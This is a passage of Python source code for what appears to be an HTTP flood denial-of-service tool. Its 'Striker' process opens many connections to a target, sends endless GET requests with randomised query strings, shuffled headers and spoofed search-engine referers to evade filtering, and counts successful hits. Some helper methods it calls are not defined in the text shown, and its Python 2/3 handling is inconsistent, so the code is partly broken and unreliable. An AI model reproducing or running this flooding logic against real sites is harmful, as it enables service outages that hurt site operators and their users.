from multiprocessing import Process, Manager
import urlparse
import random
import sys

if sys.version_info < (3,0):
    import httplib
    HTTPCLIENT = httplib
else:
    import http.client
    HTTPCLIENT = http.client

class Striker(Process):
    def __init__(self, url, nr_sockets, counter):
        super(Striker, self).__init__()
        self.counter = counter
        self.nr_socks = nr_sockets
        self.runnable = True
        self.socks = []

        parsedUrl = urlparse.urlparse(url)
        self.ssl = parsedUrl.scheme == 'https'
        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path
        self.port = parsedUrl.port or (443 if self.ssl else 80)
        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://' + self.host + '/'
        ]

    def run(self):
        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(c)

                for conn_req in self.socks:
                    (url, headers) = self.createPayload()
                    conn_req.request('GET', url, None, headers)

                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
            except:
                self.incFailed()

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass

    def createPayload(self):
        req_url, headers = self.generateData()
        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]
        return (req_url, random_headers)

    def generateData(self):
        param_joiner = "&" if self.url.count("?") > 0 else "?"
        request_url = self.url + param_joiner + self.generateQueryString(random.randint(1,5))
        http_headers = self.generateRandomHeaders()
        return (request_url, http_headers)

    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    def incCounter(self):
        try:
            self.counter[0] += 1
        except:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except:
            pass

